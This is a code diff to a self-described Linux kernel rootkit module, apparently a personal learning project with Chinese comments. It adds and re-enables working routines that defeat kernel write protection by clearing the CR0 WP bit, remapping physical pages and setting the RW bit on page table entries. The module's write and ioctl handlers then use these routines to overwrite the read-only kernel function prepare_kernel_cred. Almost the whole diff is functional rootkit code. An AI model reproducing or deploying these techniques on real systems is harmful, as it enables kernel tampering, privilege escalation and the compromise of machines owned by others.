@@ -10,7 +10,7 @@ struct kernel_args{
     int size;
 };
 
-
+/* 使用重映射来修改只读页面 */
 static int arbitrary_remap_write(void *dst, void *src, size_t size){
     size_t phys_addr, phys_offset;
     size_t phys_ioremap_addr;
@@ -32,7 +32,9 @@ static size_t asm_read_cr0(void){
     asm volatile(
         "movq %%cr0, %%rax;"
         "movq %%rax, %0;"
-            :"=r"(cr0):: "%rax"
+        :"=r"(cr0)
+        :
+        : "%rax"
     );
     return cr0;
 }
@@ -41,10 +43,11 @@ static void asm_write_cr0(size_t cr0){
     asm volatile(
         "movq %0, %%rax;"
         "movq %%rax, %%cr0;"
-            :: "r"(cr0): "%rax"
+        :
+        : "r"(cr0)
+        : "%rax"
     );
 }
-
 
 static void asm_disable_wp(void){
     size_t cr0;
@@ -56,27 +59,48 @@ static void asm_disable_wp(void){
     }
 }
 
-/*
+
 static void asm_enable_wp(void){
     size_t cr0;
     cr0 = asm_read_cr0();
 
     if(!((cr0 >> 16) & 1)){
         cr0 |= (1 << 16);
-        printk(KERN_INFO "[peiwithhao rootkit]set cr0:%lx", cr0);
-        //asm_write_cr0(cr0);
+        asm_write_cr0(cr0);
     }
 }
-*/
 
+/* 修改cr0来写入只读页面 */
 static void arbitrary_cr0_write(void *dst, void *src, size_t count){
     size_t orig_cr0;
     orig_cr0 = asm_read_cr0();
     asm_disable_wp();
     memcpy(dst, src, count);
     /* 如果以前设置了WP, 将其开启 */
-    asm_write_cr0(orig_cr0);
+    if(orig_cr0 >> 16 & 1) asm_enable_wp();
 }
+
+static size_t arbitrary_pte_write(void *dst, void *src, size_t size){
+    pte_t * pte;
+    pte_t orig_pte;
+    unsigned int level;
+    pte = lookup_address((unsigned long)dst, &level);
+    if(IS_ERR(pte)){
+        printk(KERN_INFO "[peiwithhao rootkit] get pte failed...");
+        return PTR_ERR(pte);
+    }
+    /* 保存以前的pte */
+    orig_pte.pte = pte->pte;
+    /* 将rw位置为1 */
+    pte->pte |= _PAGE_RW;
+    printk(KERN_INFO "[peiwithhao rootkit] changed pte %lx, ", pte->pte);
+    memcpy(dst, src, size);
+    /* 恢复原来的pte */
+    pte->pte = orig_pte.pte;
+    return 0;
+}
+
+
 
 
 static ssize_t pwh_rootkit_read(struct file *file, char __user *buf, size_t count, loff_t * ppos){
@@ -84,10 +108,11 @@ static ssize_t pwh_rootkit_read(struct file *file, char __user *buf, size_t coun
 }
 static ssize_t pwh_rootkit_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos){
     arbitrary_remap_write(prepare_kernel_cred, "peiwithhao", 10);
+    arbitrary_cr0_write(prepare_kernel_cred, "peiwithhao", 10);
     return 0;
 }
 static long pwh_rootkit_ioctl(struct file *file, unsigned int cmd, unsigned long arg){
-    arbitrary_cr0_write(prepare_kernel_cred, "peiwithhao", 10);
+    arbitrary_pte_write(prepare_kernel_cred, "peiwithhao", 10);
     return 0;
 }
 /* 打开类容 */
